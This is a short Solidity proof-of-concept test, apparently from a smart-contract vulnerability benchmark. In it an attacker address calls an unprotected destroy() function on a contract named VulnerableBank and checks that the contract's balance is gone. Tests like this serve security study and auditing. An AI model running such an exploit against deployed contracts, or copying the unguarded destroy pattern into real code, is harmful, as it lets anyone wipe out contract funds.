// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./basetest.sol";
import "../src/5efeb9b3-7ea9-49ce-abf9-e297992d533f_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        target.destroy();
        // Ensure the contract's balance is zero after destruction
        assertEq(address(target).balance, 0);
    }
}